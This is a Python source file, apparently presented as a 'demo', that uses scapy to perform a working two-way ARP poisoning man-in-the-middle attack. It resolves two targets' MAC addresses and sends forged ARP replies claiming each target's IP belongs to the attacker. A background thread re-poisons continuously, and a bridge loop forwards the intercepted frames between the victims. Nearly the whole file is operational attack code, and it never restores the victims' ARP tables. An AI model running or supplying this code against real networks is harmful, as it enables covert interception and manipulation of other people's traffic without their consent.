import os
import time
import threading
from typing import Optional
from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff

def _resolve_mac(ip: str) -> str:
    """
    Resolve a target IP to a MAC address using ARP. Returns None if unknown.
    """
    return getmacbyip(ip)


def _build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str) -> ARP:
    """
    Craft an ARP reply telling target_ip that spoof_ip is at attacker_mac.
    """
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)


def _select_iface(target_ip: str, provided_iface: Optional[str] = None) -> str:
    """
    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
    """
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    # conf.route.route returns (iface, gw, addr)
    route_iface = conf.route.route(target_ip)[0]
    return route_iface or conf.iface


def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None):
    chosen_iface = _select_iface(ip_a, iface)
    conf.iface = chosen_iface

    attacker_mac = get_if_hwaddr(chosen_iface)

    mac_a = _resolve_mac(ip_a)
    mac_b = _resolve_mac(ip_b)

    if not mac_a or not mac_b:
        print("[!] Could not resolve MACs for both targets. Aborting ARP demo.")
        return

    pkt_to_a = _build_spoof_packet(ip_a, mac_a, ip_b, attacker_mac)
    pkt_to_b = _build_spoof_packet(ip_b, mac_b, ip_a, attacker_mac)
    frame_a = Ether(src=attacker_mac, dst=mac_a) / pkt_to_a
    frame_b = Ether(src=attacker_mac, dst=mac_b) / pkt_to_b

    print(f"[i] Poisoning {ip_a} (MAC {mac_a}) saying {ip_b} is at {attacker_mac}")
    print(f"[i] Poisoning {ip_b} (MAC {mac_b}) saying {ip_a} is at {attacker_mac}")

    for _ in range(count):
        sendp(frame_a, verbose=False, iface=chosen_iface)
        sendp(frame_b, verbose=False, iface=chosen_iface)
        time.sleep(interval)

    print("[i] ARP poisoning packets sent (initial burst).")
    return chosen_iface, attacker_mac, mac_a, mac_b, frame_a, frame_b


def _start_poisoning_loop(frame_a, frame_b, interval: float, iface: str) -> threading.Event:
    """
    Keep sending poison frames in the background to maintain the MITM position.
    """
    stop_event = threading.Event()

    def loop():
        while not stop_event.is_set():
            sendp(frame_a, verbose=False, iface=iface)
            sendp(frame_b, verbose=False, iface=iface)
            stop_event.wait(interval)

    thread = threading.Thread(target=loop, daemon=True)
    thread.start()
    return stop_event


def _get_iface_mtu(iface: str) -> Optional[int]:
    """
    Read interface MTU from sysfs; fall back to None if unavailable.
    """
    try:
        with open(f"/sys/class/net/{iface}/mtu", "r") as f:
            return int(f.read().strip())
    except (OSError, ValueError):
        return None


def _is_multicast_mac(mac: str) -> bool:
    try:
        first_octet = int(mac.split(":")[0], 16)
        return bool(first_octet & 1)
    except (ValueError, IndexError):
        return False


def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str, stop_event: threading.Event) -> None:
    """
    Minimal L2 bridge: forward frames between mac_a and mac_b that arrive at us.
    """
    print("[i] Forwarding traffic between targets (Ctrl+C to stop)...")

    mtu = _get_iface_mtu(iface)
    if mtu:
        print(f"[i] Using interface {iface} MTU {mtu} for bridge decisions.")

    def forward(pkt):
        if not pkt.haslayer(Ether):
            return
        eth = pkt[Ether]
        if eth.src == attacker_mac:
            return
        dst_is_broadcast = eth.dst.lower() == "ff:ff:ff:ff:ff:ff"
        dst_is_multicast = _is_multicast_mac(eth.dst)

        if eth.src == mac_a:
            dst_mac = mac_b
        elif eth.src == mac_b:
            dst_mac = mac_a
        else:
            return

        # Forward any traffic sent to us, plus broadcast/multicast, to the other side.
        if not (eth.dst == attacker_mac or dst_is_broadcast or dst_is_multicast):
            return

        if mtu and len(pkt) > mtu:
            # Allow forwarding; sendp will handle actual interface constraints.
            pass

        pkt = pkt.copy()
        pkt[Ether].src = attacker_mac
        pkt[Ether].dst = dst_mac
        sendp(pkt, iface=iface, verbose=False)

    sniff(iface=iface, prn=forward, store=False, stop_filter=lambda _: stop_event.is_set())


def run(target1_ip: str, target2_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
    """
    Demonstrate basic ARP poisoning between two targets.
    """
    poisoned = _poison_bidirectional(target1_ip, target2_ip, count=count, interval=interval, iface=iface)
    if not poisoned:
        return
    chosen_iface, attacker_mac, mac_a, mac_b, frame_a, frame_b = poisoned
    poison_stop = _start_poisoning_loop(frame_a, frame_b, interval, chosen_iface)
    try:
        _bridge_loop(mac_a, mac_b, attacker_mac, chosen_iface, poison_stop)
    except KeyboardInterrupt:
        print("\n[i] Stopping forwarding loop.")
    finally:
        poison_stop.set()
